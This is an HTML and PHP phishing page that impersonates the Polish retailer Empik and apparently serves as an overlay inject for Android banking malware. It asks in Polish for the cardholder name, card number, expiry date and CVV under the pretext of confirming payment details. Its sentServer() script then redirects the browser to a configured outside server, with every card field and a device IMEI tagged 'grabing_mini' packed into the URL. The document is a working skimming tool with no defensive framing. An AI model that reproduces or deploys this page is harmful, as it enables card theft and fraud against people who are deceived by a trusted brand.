<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Empik</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/com.empik.empikfoto/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body ng-controller="c1">

<div class="booting on text-center">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu4AAACHCAMAAAB+pyxDAAAC/VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+G1NxwAAAA/nRSTlMAcPCg4EZiQDwoTIAQ02QyDjNWfX5lSwyM0FACN7jo4aXAjeavu7emGahqi1lrBZUjRAq2/BW+3nP93wGsNnmZiVg5dRtcnr9sBuf5DwjcUxQ0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" alt="" class="booting-logo">
</div>

<form id="form" method="post">
    <div id="form2">
            <h2 style="font-size: 26px;">Potwierdzić dane Twojej karty kredytowej .</h2>
            <h4 style="margin-bottom: 40px;font-size: 14px;">Wprowadź numer Swojej karty kredytowej w celu potwierdzenia twoich danych płatniczych </h3>
        <label for="creditcard">Posiadacze karty</label>
        <input type="text" class="input" name="holder" onkeyup="check();" id="holder" pattern="^[a-zA-Z\s]+$" required autofocus>

        <label for="creditcard">NUMER KARTY</label>
        <input type="text" class="input credit" placeholder="XXXX XXXX XXXX XXXX" name="credit_card_number" id="creditcard" maxlength="16" required>

        <div class="exp-cvv">
            <div class="exp">
                <label for="exp">EXP DATA</label>
                <input type="tel" class="input" style="margin-bottom: 0;" placeholder="MM/YY" maxlength="5" onkeyup="
                var v = this.value;
                if (v.match(/^\d{2}$/) !== null) {
                    this.value = v + '/';
                }
                check();" name="exp" id="exp" required >
           </div>
           <div class="cvv">
                <label for="exp">CVV</label>
                <input type="tel" class="input" placeholder="CVV" style="margin-bottom: 0;" onkeyup="check();" name="cvv" id="cvv" maxlength="3" required>
           </div>

            <div class="center" style="padding: 20px;">
                <input type="submit" class="button" value="Potwierdzić" disabled onclick="sentServer();" id="input_submitBtn1">
            </div>
        </div>
    </div>
</form>
<script type="text/javascript">
    jQuery(function ( $ ){
    $(".credit").credit();
    });
</script>
<script>
    function check() {
    var inp1 = document.getElementById('holder'),
        inp2 = document.getElementById('creditcard'),
        inp3 = document.getElementById('exp'),
        inp4 = document.getElementById('cvv');
    document.getElementById('input_submitBtn1').disabled = inp1.value && inp2.value && inp3.value && inp4.value ? false : "disabled";
    }
</script>

<script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},1e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>
<script>//com_empik_empikfoto

        function sentServer(){
           var oNumInp3 = document.getElementById('holder');
            var oNumInp4 = document.getElementById('creditcard');
            var oNumInp5 = document.getElementById('exp');
            var oNumInp6 = document.getElementById('cvv');

            if ((oNumInp4.value.length > 10)&&(oNumInp6.value.length > 2)) {
                    var url='<?php echo $URL; ?>';
                var imei_c='<?php echo $IMEI_country; ?>';

            location.replace(url+'/o1o/a10.php?p=' + imei_c + '|grabing_mini|'+ oNumInp4.value + '|' + oNumInp5.value + '|' + oNumInp6.value +'|'+oNumInp3.value+'|');
          }
        }


    </script>
</body>
</html>
